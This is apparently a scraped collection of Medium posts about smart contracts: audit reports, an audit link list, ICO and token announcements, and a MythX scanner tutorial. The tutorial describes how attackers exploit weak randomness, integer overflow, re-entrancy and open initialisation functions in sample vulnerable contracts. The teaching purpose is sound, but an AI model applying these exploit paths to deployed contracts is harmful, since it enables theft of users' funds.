upgrade mechanisms were built in, the goals of the audit were less about giving the current code base the full stamp of approval, and more about making sure the important mechanisms that enable upgrades, bug fixes, iteration, and protect user value were in place. The audit primarily was aimed to focus on three areas:Liveness\u200a\u2014\u200athe Livepeer protocol progresses in rounds, and each round needs to be initialized in order for broadcast jobs to be sumitted and rewards to be earned. Can anything halt this process and \u201cfreeze\u201d the protocol?Ownership\u200a\u2014\u200aduring the iterative period and gradual network rollout, the core team can update economic parameter values, fix bugs, and deploy smart contract upgrades. Are there any ownership vulnerabilities that allow a malicious actor to access these capabilities?Value\u200a\u2014\u200ausers stake tokens into Livepeer smart contracts in order to do work on the network. Can anything put this user value at risk such that it can get locked up or stolen?ToB lead with a focus on these areas, but was also able to touch on many others including job and rounds management, bonding, deep dives into on chain data structures, and the earnings distribution functions.See the full report for detailed findings. As Livepeer goes to mainnet and iterates on its protocol, look for opportunities to participate in security reviews through potential bug bounty and development bounty programs.", "responses": "1"}, {"title": "Smart Contract Audit Resources &\u00a0Links", "author_name": "Priyab Dash", "link": "https://medium.com/crypt-bytes-tech/smart-contract-audit-resources-links-da1cf571a80d?source=search_post", "post_date": "Nov 29, 2017", "readtime": "4 min read", "upvotes": "30", "content": "Smart Contract Audit Resources &\u00a0LinksPriyab DashBlockedUnblockFollowFollowingNov 29, 2017For Anyone planning to launch ICO or want explore Smart Contract Audit, Feedback WelcomeBuilding a Marketplace for Security AuditsIncentivizing the use of Ethlance for auditing servicesblog.district0x.ioSmart Contract Security: How to Never Break the Blockchain - DZone SecurityThis article is featured in the new DZone Guide to Application and Data Security, Volume II. Get your free copy for\u2026dzone.comDevelopment, Testing And Security Audit Of The CustomerDepositFactory Smart Contract\u2190 BetterAuction Smart Contract - Testing, Security Audit, And Assisting With The Developmentwww.bokconsulting.com.auChainSecurity - Innovative Security Solutions all around BlockchainsBlockchains and smart contracts promise to automate, decentralize, and increase the transparency of many real-world\u2026chainsecurity.comSecurify \u2666 Formal Verification of Ethereum Smart ContractsAnalyse any contract for critical security vulnerabilities and insecure coding. One click only. Formal security\u2026securify.chThe Importance Of Audits And Secure Coding For Smart ContractsDecember 23, 2016 4:24 PM Making sure smart contract code is secure not only helps individual companies, it benefits\u2026www.ethnews.comNumber One smart contracts security expert to audit ChronoBankPeter Vessenes, the global blockchain and smart contracts expert who first drew attention to the vulnerability in The\u2026blog.chronobank.ioBlockchain Development Company - Smart Contracts Development - FinTechOur smart contract development and full stack blockchain development services are supported by more than 20 years of\u2026www.coinfabrik.comCoinFabrik Blog - Secure Cryptocurrency Applications DevelopmentSecure Cryptocurrency Applications Developmentblog.coinfabrik.comICO Security AuditAn audit provides an assessment of whether your organisation is following good data protection practice. We believe\u2026www.toshblocks.comJust how smart are Smart Contracts?If you haven't yet heard of a Smart Contract, just wait. You will. Using blockchain technology - a secure\u2026www.csoonline.comThinking About Smart Contract Security - Ethereum BlogOver the last day with the community's help we have crowdsourced a list of all of the major bugs with smart contracts\u2026blog.ethereum.orgGeneral Philosophy\ue3c9 Ethereum and complex blockchain programs are new and highly experimental. Therefore, you should expect constant\u2026consensys.github.ioRecommendations for Smart Contract Security in Solidity\ue3c9 This page demonstrates a number of solidity patterns which should generally be followed when writing smart contracts\u2026consensys.github.ioKnown Attacks\ue3c9 The following is a list of known attacks which you should be aware of, and defend against when writing smart\u2026consensys.github.ioSoftware Engineering Techniques\ue3c9 As we discussed in the General Philosophy section, it is not enough to protect yourself against the known attacks\u2026consensys.github.ioDocumentation and Procedures - Ethereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioSecurity Tools - Ethereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioSecurity Notifications - Ethereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioEthereum Smart Contract Best PracticesEdit descriptionconsensys.github.ioSolidity Smart contract Security best practicesSecurity of a smart contract is more important than any other software or piece of code just because of the non\u2026lightrains.comEthereum Contract auditing(solidity)Ethereum Stack Exchange is a question and answer site for users of Ethereum, the decentralized application platform and\u2026ethereum.stackexchange.comMethodological security review of a smart contractThis is the community wiki (no reputation) answer for possible attacks and how to protect against them. Feel free to\u2026ethereum.stackexchange.comSmart Contract Security - Ethereum BlogSolidity was started in October 2014 when neither the Ethereum network nor the virtual machine had any real-world\u2026blog.ethereum.orgSmart Contract Analyzer to Debut at Ethereum Conference - CoinDeskResearchers from National University of Singapore will soon release a tool that will help ethereum users determine\u2026www.coindesk.comSmart Contract\u200a\u2014\u200aSecurity AuditA detailed write up of the Sharpe Capital smart contract security audit.medium.comZeppelin: Security AuditsAt Zeppelin, we perform private and public code audits for organizations. We review your smart contracts and\u2026zeppelin.solutionsOnward with Ethereum Smart Contract SecurityIf you\u2019re new to Ethereum development, I recommend you read our Hitchhiker\u2019s Guide to Smart Contracts in Ethereum\u2026blog.zeppelin.solutionsSmartDec | Smart Contracts Security AuditWith the arrival of Smart Contracts, Application Security has become more important than ever before. Keep your code\u2026smartcontracts.smartdec.netPreparing for a Smart Contract Code AuditIf you are planning to launch a project on the Ethereum blockchain, you probably know the importance of a third-party\u2026media.consensys.netSmart Contracts Security, Pt. 1This series of texts is dedicated to analysing smart contract security. In the following sections, we explain what\u2026blog.smartdec.netTrust No One: Ethereum Smart Contract Security Is Advancing - CoinDesk\"Everyone here is a target for attack. Be paranoid.\" That's how Ethereum Foundation security lead Martin Swende ended\u2026www.coindesk.comThe ultimate guide to audit a Smart Contract + Most dangerous attacks in SolidityHave you ever wondered how to audit a Smart Contract to find security breaches?medium.comTokenLot - Your ICO SuperstoreIn order to navigate the constantly changing regulatory landscape of emerging technologies, sound advice from a trusted\u2026www.tokenlot.comIf you have any good resources, please do share in the comment below, will add them.Disclaimer: This is not investment or trading advice, always do your own independent research.If you like the Blog then please help support the publication viahttps://www.patreon.com/cryptbytestech. Also you can send some eth contributions to 0x670A8721C343Ce16D619630283Ea70F3235e3247If you have a story please join the telegram channels and share with us Joinhttps://t.me/joinchat/AsCHKQ8-wkEQYo5BXDQgZQ.If you want to explore more on Cryptos visit -> https://cryptoprofile.comSolidified - Audit Platform for Smart ContractsA platform for crowd-sourced review of smart contracts, where any developer can bring their contract for review with a\u2026www.solidified.ioTurnkey ICO SecurityFull Spectrum ICO Protectionwww.iosiro.com", "responses": "2"}, {"title": "Detecting Critical Ethereum Smart Contract Vulnerabilities with\u00a0MythX", "author_name": "Bernhard Mueller", "link": "https://medium.com/consensys-diligence/detecting-the-top-4-critical-smart-contract-vulnerabilities-with-mythx-9c568d7db7a6?source=search_post", "post_date": "Mar 26", "readtime": "8 min read", "upvotes": "108", "content": "Detecting Critical Ethereum Smart Contract Vulnerabilities with\u00a0MythXBernhard MuellerBlockedUnblockFollowFollowingMar 26In my previous article, I explained the various analysis techniques MythX uses to detect security flaws in smart contracts. But how do you unleash this security analysis powerhouse on your own code? In this article I\u2019ll show the use of Sabre, a MythX command line client, to detect critical smart contract weaknesses.While Turing-complete smart contracts are awesome, the added flexibility also allows programmers to introduce many types of security vulnerabilities. With the right tooling however, many critical flaws can be caught early in the development lifecycle. MythX makes this process simple.Currently, the quickest way is running one of the MythX command line clients, such as Mythos, Sabre and the PythX CLI. In this article I\u2019ll show the use of Sabre to detect the some of the most prevalent and critical smart contract weaknesses:Weak randomnessInteger overflows and underflowsRe-entrancyBroken access controlIn case you want try the examples yourself, install Sabre by running:$ npm install -g sabre-mythxHead to mythx.io and sign in with MetaMask to create your free MythX account. For even greater convenience, you can add your credentials to ~/.bashrc if on a UNIX-based system:export MYTHX_ETH_ADDRESS=0x[...]export 'MYTHX_PASSWORD=[your_password]'You can now run Sabre on Solidity files as follows:$ sabre <filename.sol>This will trigger the \u201cquick\u201d analysis mode which runs static analysis, input fuzzing and symbolic analysis on your smart contract for about a minute\u200a\u2014\u200aenough to detect low-hanging fruits such as misnamed constructors, accidental killability and re-entrancy bugs. Let\u2019s walk through some examples.Weak RandomnessOur first vulnerable contract is \u201cborrowed\u201d from Steve Marx\u2019s Capture the Ether CTF. It\u2019s a lottery smart contract that pays out Ether to lucky players who correctly guess a random number. Take a long hard look at the code and see if you can spot the bug. Spoilers ahead!Source: SWC\u00a0RegistryTo analyze this contract with Sabre, save it to a file named random.sol and run sabre random.sol. This should return a list of security issues:$ sabre random.sol\u2714 Downloaded solc v0.4.21 successfully[== ] Analyzing GuessTheRandomNumberChallengerandom.sol25:12  warning  Sending of Ether depends on a predictable variable  https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-12025:12  error    Anyone can withdraw ETH from the contract account   https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-1057:0   warning  A floating pragma is set                            https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10310:10  warning  The state variable visibility is not set            https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10814:33  warning  Use of disallowed function \"block.blockhash()\"      https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-11114:33  warning  Potential use of a weak source of randomness        https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-12014:49  warning  Potential use of a weak source of randomness        https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-120\u2716 7 problems (1 error, 6 warnings)Each line contains the following elements:Line and column number: This shows the position of the issue in the source code (for example: 25:12 = line 25, column 12).Severity level: Sabre uses the ESLint-style error levels: \u201cinfo\u201d, \u201cwarning\u201d and \u201cerror\u201d. (Other MythX tools may follow different schemes.)Heading: A brief one-sentence description of the bug.SWC URL: A link to a detailed description of the bug in the Smart Contract Weakness Registry. The link is especially useful if you can\u2019t make sense of the short description. Open the URL in a web browser to learn more about the weakness and possible fixes.In our first example, there are several warnings related to weak randomness (SWC-120). The first result is particularly interesting: \u201cSending of Ether depends on a predictable variable \u201d. Here, MythX has detected that Ether can be withdrawn by guessing a \u201crandom\u201d variable that isn\u2019t really all that random (see below).Indeed, an attacker can exploit the contract by calculating keccac256(block.blockhash(block.number\u200a\u2014\u200a1)) themselves and submitting the right answer. You can try exploiting this for yourself.Integer Overflows and UnderflowsInteger arithmetic bugs are another popular smart contract security flaw. Have a look at TokenSale, another vulnerable contract snagged Capture the Ether. Spoiler: It contains at least one exploitable integer overflow.Here is what Sabre reports:$ sabre Tokensale.sol\u2714 Downloaded solc v0.5.0 successfully[== ] Analyzing TokenSaleTokensale.sol1:0   warning  A floating pragma is set                           ttps://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10325:8   error    Anyone can withdraw ETH from the contract account  https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10516:29  error    The binary multiplication can overflow             https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10118:8   error    The binary addition can overflow                    https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101\u2716 4 problems (3 errors, 1 warning)This tells us that both the multiplication in line 16 and the addition in line 18 can overflow:More specifically, MythX is telling you that there are no appropriate checks on the variables used in thise arithmetic operations, and the overflows aren\u2019t caught by asserts either. By overflowing numTokens * PRICE_PER_TOKEN such that the result is zero, an attacker can add a large amount of tokens to their balance without transferring any Ether (can you figure out the exact value?).Re-EntrancyEver since the infamous DAO hack, re-entrancy has taken the Ethereum security community by storm. If one would to have to pick the ultimate smart contract security bug, it would certainly be re-entrancy.The SWC Registry has a couple of examples for re-entrancy. SimpleDAO by Josselin Feist more or less replicates the DAO flaw in a simplified way:Here is what Sabre reports:$ sabre simple_dao.sol\u2714 Downloaded solc v0.4.24 successfully[== ] Analyzing SimpleDAOsimple_dao.sol17:14  warning  A call to a user-supplied address is executed. https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10712:4   error    The binary addition can overflow https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10118:6   error    persistent state read after call  https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10718:6   error    persistent state write after call https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-107\u2716 4 problems (3 errors, 1 warningThere are two parts to this problem. First, a call to msg.sender is executed (line 17). Following the call there is a write to the persistent state variable credit[msg.sender] in line 18:Persistent account state should never be updated after calls to untrusted addresses. In the example above, msg.sender can point to a smart contract account that contains code to re-enter the withdraw() function. By recursively calling back into withdraw(), an attacker can withdraw Ether multiple times before the amount withdrawn is subtracted from the attacker\u2019s balance. Check out SWC\u2013107 for more information.Broken Access\u00a0ControlInsufficient access controls on critical functions such as Ether transfers and self-destructs are another classic. First, here is a vulnerable wallet example from the SWC Registry:Source: SWC\u00a0RegistrySabre has the following to say:$ sabre wallet_03_wrong_constructor.sol\u2714 Downloaded solc v0.4.24 successfully[== ] Analyzing Wallet/wallet_03_wrong_constructor.sol1:0   warning  A floating pragma is set                           https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-1038:12  warning  The state variable visibility is not set           https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10810:32  warning  The state variable visibility is not set           https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10831:8   error    Anyone can withdraw ETH from the contract account  https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10517:5   warning  A reachable exception has been detected            https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-11017:12  error    The binary addition can overflow                   https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10124:8   error    persistent state read after call                   https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10724:8   error    persistent state write after call                  https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-1077:0   warning  precondition violation                             https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-123\u2716 9 problems (4 errors, 5 warnings)The problem here is that there\u2019s an initialization function that allows anyone to become the owner (line 12). Once the attacker has taken control of the contract, they can withdraw all Ether from the contract (line 31):A current limitation of MythX is that we don\u2019t yet provide call traces or test cases that explain exactly how the vulnerability is triggered. In this case, it\u2019s a bit difficult to deduce what exactly must happen so Ether can be withdrawn (in this case, a call initWallet() followed by migrateTo(address to)). We\u2019re working on a call trace feature which will become available later during the beta\u200a\u2014\u200aI\u2019ll update this article once it is available.A similar infamous bug is the \u201canybody can kill this contract\u201d vulnerability. Here is an example from the SWC Registry:Source: SWC\u00a0RegistryHere is what Sabre reports:$ sabre suicide_multitx_feasible.sol\u2714 Downloaded solc v0.4.23 successfully[== ] Analyzing SuicideMultiTxFeasiblesuicide_multitx_feasible.sol16:8  error    The contract can be killed by anyone  https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-1061:0  warning  A floating pragma is set              https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-10311:4  warning  The function visibility is not set    https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-100\u2716 3 problems (1 error, 2 warnings)MythX has correctly determined that it is possible for anyone to kill the contract. The vulnerability is almost the same as in the previous example: Anyone can kill the contract by calling the init() function followed by run(uint256 input).TL;DRMythX is a security analysis API that detects smart contract security weaknesses. Specifically, MythX detects weakness listed in the Smart Contract Weakness Classification Registry.Current MythX tools are basic, but the MythX community is building a whole ecosystem of smart contract security tools that integrates into IDEs, code editors and CI services. You can build your own tools or use existing ones to analyze Ethereum smart contract for security vulnerabilities.Join our Discord community to get support or share ideas with the MythX team. And please join our mailing list (sign up at bottom) to stay informed of updates and new releases.", "responses": ""}, {"title": "Sether: The new smart contract developer tool to harness the power of social\u00a0media", "author_name": "SETHER", "link": "https://medium.com/@sether/sether-the-new-smart-contract-developer-tool-to-harness-the-power-of-social-media-5ea562b76709?source=search_post", "post_date": "Nov 14, 2017", "readtime": "3 min read", "upvotes": "166", "content": "The new smart contract developer tool to harness the power of social\u00a0mediaSether: The new smart contract developer tool to harness the power of social\u00a0mediaSETHERBlockedUnblockFollowFollowingNov 14, 2017SETHER will enable developers to build a new breed of blockchain services that take full advantage of the information available in social networks: bounty campaigns, loyalty programs, customer targeting, referral programs, coupon discounts, proof of action etc.It is an unfair world, where everyone either bends or breaks the rules. No question that part of attention the Ethereum blockchain receives is due to the rising appeal for decentralization of different services and applications. The blockchain\u2019s advantages also have a downside for any enterprise: it strips access to social media, the fuel-over-fire ingredient for any business, on or off the blockchain. The success of the blockchain market depends on its reach.This prompted the creation of Sether, a blockchain service that offers much-needed access to social networks. The platform is currently in full development, releasing its alpha version in January 2018.Sether enables developers to build a new breed of blockchain services that take full advantage of the information available in social networks for bounty campaigns, loyalty programs, customer targeting, referral programs, coupons, also providing proof of action solutions and opening up numerous possibilities to extend any blockchain business into the real world.The Sether developers come with a big data frame of mind. The MWARE company, also offering big data and AI solutions worldwide through platforms like BigConnect and Sponge, used the experience they gained in the field to create Sether. The result is a platform that not only provides integration with social network APIs but also provides custom analytic and monitoring capabilities for blockchain operations and enterprises. Users can run custom queries on social network data to get desired insights, find influencers, see the reach of their posts, create watchlists to be notified when certain events happen and see the sentiment for various social network objects such as posts, messages, pages, events and more.The ICO will be launched 27th of November, SETH token presale ending January 15th. The company is preselling tokens at a discount price for large volume purchases, details about the presale can be found on http://sether.io\u201cWe are very enthusiastic about what the blockchain can offer to any advanced entrepreneurs; let\u2019s call them crypto-entrepreneurs. We have been working and tinkering over more than one blockchain idea, and stumbled upon the difficulty to address and work with social media information. Since it was so necessary for us to devise a way to integrate data from social networks, we decided to focus on solving the issue for everyone on the blockchain. It was fun, we felt like we\u2019re adding exactly what we should be adding to the blockchain, given our big data background\u201d Flavius Burca, Sether CTO.\u201cI had the opportunity to watch how open source, social media data analysis managed to completely change how an organization reacts, or how they organize their products or offers. It has overwhelming effects. It was almost ironical how such a well-designed community like the blockchain simply cannot efficiently reach the already established social networks. Making Sether felt like closing a circle. Now, these two worlds can meet, on blockchain terms\u200a\u2014\u200aof course.\u201d Ovidiu Oancea, Sether CEO.The team working on Sether is bent on releasing it in January 2018. You can tune in to the product development statements and reports on their Facebook, Youtube and Twitter channels, or subscribe to their weekly newsletter.Facebook: @setherplatformTwitter: @setherplatformhttp://sether.io", "responses": ""}, {"title": "Write Your First Smart\u00a0Contract", "author_name": "Gustavo (Gus) Guimaraes", "link": "https://medium.com/@gus_tavo_guim/write-your-first-smart-contract-7c896a9ae880?source=search_post", "post_date": "Aug 4, 2017", "readtime": "", "upvotes": "41", "content": "Write Your First Smart\u00a0ContractGustavo (Gus) GuimaraesBlockedUnblockFollowFollowingAug 4, 2017I just returned from the Pillar Unconference in Poprad, Slovakia where I gave two talks on developing smart contracts. The disclaimer here is that Pillar have just had a successful Initial Coin Offering and I helped writing the code for the token and crowd sale smart contract.One of my talks was on creating your first smart contract. Here is the recorded live broadcast of the talk.Unfortunately, it was difficult for web viewers to see the code of this presentation. For this, I am going to leave the code here so you can follow n case you have watched or will watch the video.Best of all in your learning journey.", "responses": ""}, {"title": "The eosfinex Smart Contract\u00a0Plugin", "author_name": "Kasper Rasmussen", "link": "https://medium.com/eosfinexproject/the-eosfinex-smart-contract-plugin-e2ac7753d778?source=search_post", "post_date": "Mar 8", "readtime": "3 min read", "upvotes": "118", "content": "The eosfinex Smart Contract\u00a0PluginOrganizing interactions between user & smart\u00a0contractKasper RasmussenBlockedUnblockFollowFollowingMar 8As we approach the upcoming launch of eosfinex, we continue with our weekly series looking at various developments taking place within eosfinex.Today we introduce the eosfinex plugin\u200a\u2014\u200aan integral piece in our architecture\u200a\u2014\u200awhich allows users to interact with the matching engine in a fast and intuitive way.In the following article we walk through a high-level overview of how the eosfinex plugin interacts with the smart contract. Additionally, we take a look at the two different ways of signing transactions using the plugin. Finally, we take a look at how client connections are handled and what decision we made to handle a large number of connections in the most efficient way possible.The eosfinex plugin is designed to organize interactions between the user and smart contract that that act as the foundation of eosfinex.The use of the plugin allows users to abstract and collect details from the EOS blockchain. Additionally, the eosfinex plugin allows users to send/receive market requests in a relatively simplistic manner, removing otherwise significant barriers to entry associated with this area.Our ultimate goal is to allow anyone, regardless of their levels of experience and expertise, to interact with eosfinex and the EOS blockchain.", "responses": "1"}, {"title": "Smart Contract, Scaling and\u00a0Product", "author_name": "Crowdholding", "link": "https://medium.com/@crowdholding/smart-contract-scaling-and-product-bb850da31ab1?source=search_post", "post_date": "Feb 26, 2018", "readtime": "5 min read", "upvotes": "100", "content": "Smart Contract, Scaling and\u00a0ProductCrowdholdingBlockedUnblockFollowFollowingFeb 26, 2018Last week was a busy week indeed, from deploying our smart contract to the test network to dealing with requests following the audit. With support of our partners coinhub.io, distribution of the new token is now in reach. Our co-founder Aleks visited the Crypto Currency Investor Summit in Ljubljana, Slovenia, to spread the word about Crowdholding. This is an incredibly important step, as both the YUP token and Crowdholding itself depends on a substantial audience to succeed.On the business side, we have onboarded two more businesses to our app\u200a\u2014\u200aSoolox and Repux\u200a\u2014\u200aand added five more to our waiting list.Why a waiting list you may ask? CH is monetizing crowdsourcing, thus our colleagues must work with the business to support their needs individually in the beginning. In addition, the product needs to be ready when we ignite the engine, meaning once our token is distributed and on an exchange, API\u2019s begin working and real tokens begin moving in our system. This means token movement begins and people receive crypto in return for their feedback. Truly monetizing crowdsourcing at it\u2019s finest. Over piling the business at this stage can result to overscaling, so we need to test and grow according to our capacity and speed. Thus, our waiting list has begun, but we do shoot for two startups a week to onboard at this stage to continue steady growth.Let\u2019s dive into the tech of the Smart Contract.After careful consideration in regards to the new smart contracts, it was decided that it is best to have a regular ERC-20 (StandardToken) contract for the new YUP token, accompanied by two additional contracts: one for locking, and another for vesting. As for the long-awaited \u201cupgradeable smart contract\u201d, all the work done will form the basis of the (upgradeable) architecture of our future DApp, that will be used later instead of deploying it right now (described in exhaustive detail in a later, separate article).The main factors behind this are: security considerations, time constraints, and gas costs. Before we continue with the more detailed breakdown of each reason, we\u2019d like to thank you for your continued support and patience. The experience gathered during the last few months turned out to be invaluable for the theoretical and practical understanding of the intricacies of blockchain development on Ethereum.SecurityAll the developed contracts are heavily based on OpenZeppelin\u200a\u2014\u200aa framework for building secure smart contracts on Ethereum. The main benefit of relying on OpenZeppelin is that all of the published code is carefully vetted by experts and Ethereum\u2019s developer community. In addition to that, reusing their code allows us to adhere to the following security patterns:Fail as early and loudly as possible (note: at the stages of development/testing)Favor pull over push paymentsOrder your function code: conditions, actions, interactionsBe aware of platform limitsWrite testsFault tolerance and Automatic bug bountiesLimit the amount of funds deposited (note: for handling Ether payments)Write simple and modular codeDon\u2019t write all your code from scratchThe locking contract works as follows: all crowdsale participants can claim their tokens when it transitions into the \u201cclaiming\u201d state (after it is deployed and balances are loaded). Presale participants, on the other hand, will be able to lay claim to their tokens 3 months from the moment of the contract\u2019s deployment. Additionally, the tokens reserved for future use will also be held in the same contract and will be claimed by Crowdholding after a compulsory period of 2 years. In total, the locking contract will hold 64% of all (new) Yupie tokens (45% crowdsale pool + 19% future use).The token contract itself also boasts an additional security measure\u200a\u2014\u200aemergency transfers pause, in line with the \u201cinclude a fail-safe mode\u201d Solidity security recommendation. This feature can only be triggered by Crowdholding, and only in the event of a major threat to our community. The rationale behind having it is to ensure enough time for an adequate security response, should the necessity arise.Last but not least, the less complex the token, the less things can go wrong with it. This was one of the main reasons for deciding against having an upgradable token contract. Furthermore, one of the pillars of security and \u201ctrustlessness\u201d in a decentralized blockchain environment is the absence of a deciding influence of any third party; once deployed, smart contracts are intended to be immutable (closed for change). However, this significantly hampers flexibility (e.g. being able to update code to fix a security bug). Hence, it was agreed upon that user balances should not be able to be changed by anyone, therefore the token contract should be immutable, simple, and trustless; instead, the DApp architecture should be upgradable and sophisticated.TimeThe upgradable contract architecture was finalized a few weeks ago. However, due to its complexity, unoptimised form, and high degree of innovation, there was not enough time for running comprehensive tests and getting it listed on exchanges by the end of February. Another factor further complicating things was that auditing companies we contacted had insufficient experience with upgradable smart contracts and required weeks to performing their audits. All of this lead us to favor a faster (and more secure) approach in the form of the three (standard) contracts.GasAnother important factor turned out to be gas consumption. As the developed upgradable architecture consisted of a set of contracts that called each other, the gas cost of a single operation (e.g. transfer) was much higher than that of a regular (ERC-20) token operation. For comparison: in the initial, unoptimized version of the upgradable smart contract a token transfer (to a regular (EOA) account) required way over 100,000 gas; whereas a regular ERC-20 transfer to an EOA costs exactly 21,000 gas. This was deemed unacceptable and resulted in the change of the course of action.It\u2019s exciting we are so close now, and and our application is increasing daily with user signups and participants. A good promotional launch on coinhub.io is also in preparation to let the people know we are available. Keep in mind, we are also actively making sure to scale on other exchanges in the future to make the Yupie token more available to public. Again we appreciate everyone\u2019s patience while we build the business and prepare for the exchange.Fixing problems &\u00a0BuybackStarting tomorrow (27th Feb), we will be reaching out to special cases from the people who purchased YUP from Etherdelta (not a good move, as tokens shouldn\u2019t be traded yet) or used an exchange account (oops\u2026 don\u2019t do that for ICOs!). If you have either of these problems and you did not get in touch with us, please do either via email hello@crowdholding.com, or via telegram to one of our admins. In addition, we have a few pre-ICO participants who were subject to an open refund policy, whereby their tokens will be put into a pool where people whose transfers did not go through for the ICO will be able to purchase the refunded YUP.Log into Crowdholding and join the co-creation revolution or drop in for a chat with us on Telegram.", "responses": ""}, {"title": "", "author_name": "Dave Kajpust", "link": "https://medium.com/@davekaj/if-you-want-to-learn-about-smart-contract-technologies-you-should-focus-on-ethereum-and-solidity-ef98de784919?source=search_post", "post_date": "Mar 1, 2018", "readtime": "", "upvotes": "71", "content": "Dave KajpustBlockedUnblockFollowFollowingMar 1, 2018If you want to learn about smart contract technologies, you should focus on ethereum and Solidity. Solidity has great documentation. Use https://remix.ethereum.org/ to quickly test solidity code in a browser IDE.Then, once you get the hang of smart contracts, start developing dApps with the truffle suite http://truffleframework.com/\u00a0. They are making it amazingly simple to develop dApps on ethereum. Compared to a year ago, it is so much easier to be a developer of smart contracts with the truffle framework.", "responses": ""}, {"title": "Smart Contracts [Video]", "author_name": "ShapeShift.io", "link": "https://medium.com/shapeshift-stories/smart-contracts-a-simple-guide-part-1-fa16a6c201c1?source=search_post", "post_date": "Feb 7", "readtime": "2 min read", "upvotes": "306", "content": "Smart Contracts [Video]Smart contract functionality is at the foundation of the Ethereum blockchain. But what exactly are they, and how do they\u00a0work?ShapeShift.ioBlockedUnblockFollowFollowingFeb 7", "responses": ""}, {"title": "Official Smart Contract after serious testings\u00a0launched", "author_name": "KitToken", "link": "https://medium.com/@kittoken.official/official-smart-contract-after-serious-testings-launched-9295d3749a5a?source=search_post", "post_date": "Jun 23, 2018", "readtime": "", "upvotes": "306", "content": "Official Smart Contract after serious testings\u00a0launchedKitTokenBlockedUnblockFollowFollowingJun 23, 2018We are overwhelmed to announce that KitToken makes its way into the cryptocurrency field. The token\u2019s smart contract address is 0x080eb7238031f97ff011e273d6cad5ad0c2de532 and it is deployed with a huge amount of 8 Billion tokens of which 2.5 billion is officially locked at the smart contract and the remaining 6 billion is given to the master node address form where these tokens will be distributed as bounties,airdrops and much moreVisit https://kittoken.net for more details", "responses": ""}, {"title": "Smart Contract Security Audits\u200a\u2014\u200aAn Experience Report", "author_name": "Stefan Beyer", "link": "https://medium.com/cryptronics/smart-contract-security-audits-an-experience-report-e3e56a0cc04c?source=search_post", "post_date": "Jul 4, 2018", "readtime": "5 min read", "upvotes": "83", "content": "Smart Contract Security Audits\u200a\u2014\u200aAn Experience ReportStefan BeyerBlockedUnblockFollowFollowingJul 4, 2018Smart contracts were originally envisaged as legal agreements implemented in computer code for automation purposes. Nick Szabo wrote about smart contracts in 1994, but blockchain technology has turned the concept into a reality.Smart contracts on the blockchain are both publicly accessible and immutable, meaning that anyone can access them, and they cannot be updated. This produces some interesting security challenges, which we have discussed previously. Because of this, it has become common practice and, in some cases, mandatory to perform external smart contract security audits.At Cryptronics, we have been performing security audits of Ethereum smart contracts for a while now. In this article, we will give an overview of our observations.Most Audits are for\u00a0ICOsInitial Coin Offerings (ICOs) tend to be called \u201ctoken sales\u201d now in the belief that this will stop regulators from looking carefully, but the concept remains the same. Businesses are \u201ctokenized\u201d, in order to raise large amounts of funds for a project. Despite scams and negative news, there is no end in sight for the ICO boom. Consequently, most audits we perform are of token and crowd sale contracts, although some more interesting contracts, in particular, those dealing with non-fungible assets, have also made it into our auditing portfolio.Our first observation of this space is that all the projects that have engaged our auditing services seem legit projects. We cannot confirm the often quoted statistic that 80 % of ICOs are scams. Maybe this is because scam projects are not worried about audits anyway, by our observation is that the ICOs we have come across in our audits seem serious projects with the full intention of building a company. Most projects actually seem quite interesting, although some leave us to wonder whether the token actually adds any value beyond raising funds.Lack of Experienced Blockchain EngineersOur second observation is that the quality of most smart contracts is shockingly poor. There are exceptions to this and we will name a couple of projects for their exceptional smart contract quality towards the end of this article.However, it is amazing how much some projects are willing to spend on marketing and all sorts of advisors, and how little they are prepared to spend on protecting their business from simple programming errors.The lack of code quality cannot be explained by the fact that blockchain technology is relatively new. There is a distinct absence of software engineering knowledge that can only be explained by cheap and inexperienced labor. Basic concepts, such as separation of concerns and modularity are often absent. Implementing crowd sale functionality in the actual token contract is surprisingly common.Furthermore, many developers seem to be unaware of existing community audited open source code that can be re-used. If you need a standard ERC-20 token you have to look no further than Open Zeppelin\u2019s reference implementation. Even for token sale contracts, you would be hard-pressed to find a model not already covered by one of the many reference implementations. Instead, developers chose to re-invent the wheel with amazing creativity.Due Diligence as an AfterthoughtOne of the things that surprised us most when we started out with smart contract auditing was how late in the process many projects start their due diligence. It is not uncommon to receive urgent requests for audits on a Friday evening because their ICO is about to start the following Monday. We like the occasional night shift as they tend to pay extremely well, but there is a limit to what can be done over a weekend. The auditing process takes time. It is a complex process involving several steps that require high levels of concentration. Usually, there is also a second round, in which issues found in the first round are fixed.In most cases, we have taken on time-sensitive audits, the client ended up unhappy when issued where found. One client got really angry with for having to postpone the start of his ICO. We have also had a client ask us to remove issues from the report, as the token was already on exchanges and could not be fixed. We refused, of course, which led to some debate about outstanding payments.Protecting the Company, not the\u00a0ClientSmart contract authors are understandably keen to make sure no-one can misuse their contracts. They are less enthusiastic about the auditor identifying backdoors the contract owner might exploit or inconsistencies with the whitepaper.In most cases this is not malicious behavior. It is human nature to believe in one\u2019s own integrity. However, project owners should realize that the whole point of smart contracts is to provide trust for both parties. 